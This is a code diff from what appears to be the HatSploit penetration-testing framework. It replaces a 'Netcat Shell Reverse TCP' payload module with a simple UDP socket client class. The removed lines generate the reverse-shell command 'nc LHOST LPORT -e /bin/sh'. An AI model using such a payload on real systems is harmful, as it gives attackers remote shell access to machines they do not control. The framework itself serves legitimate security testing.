@@ -24,47 +24,38 @@
 # SOFTWARE.
 #
 
-from core.lib.payload import Payload
-from utils.tcp import TCPClient
+import socket
+
+from core.cli.badges import Badges
 
 
-class HatSploitPayload(Payload, TCPClient):
-    details = {
-        'Category': "single",
-        'Name': "Netcat Shell Reverse TCP",
-        'Payload': "unix/generic/netcat_reverse_tcp",
-        'Authors': [
-            'Ivan Nikolsky (enty8080)'
-        ],
-        'Description': "Netcat shell reverse TCP payload.",
-        'Comments': [
-            ''
-        ],
-        'Architecture': "generic",
-        'Platform': "unix",
-        'Risk': "high",
-        'Type': "reverse_tcp"
-    }
+class UDPSocket:
+    def __init__(self, host, port, timeout=10):
+        self.host = host
+        self.port = int(port)
+        
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        self.sock.settimeout(timeout)
+        
+        self.badges = Badges()
 
-    options = {
-        'LHOST': {
-            'Description': "Local host.",
-            'Value': TCPClient.get_local_host(),
-            'Type': "ip",
-            'Required': True
-        },
-        'LPORT': {
-            'Description': "Local port.",
-            'Value': 8888,
-            'Type': "port",
-            'Required': True
-        }
-    }
+    def send(self, data):
+        try:
+            self.sock.sendto(data, (self.host, self.port))
+            return True
+        except Exception:
+            self.badges.output_error("Failed to send data!")
+        return False
 
-    def run(self):
-        local_host, local_port = self.parse_options(self.options)
+    def recv(self, size):
+        try:
+            return self.sock.recv(size)
+        except Exception:
+            self.badges.output_error("Failed to read data!")
+        return b""
 
-        self.output_process("Generating payload...")
-        payload = f"nc {local_host} {local_port} -e /bin/sh"
 
-        return payload
+class UDPClient:
+    @staticmethod
+    def open_udp(host, port, timeout=10):
+        return UDPSocket(host, port, timeout)
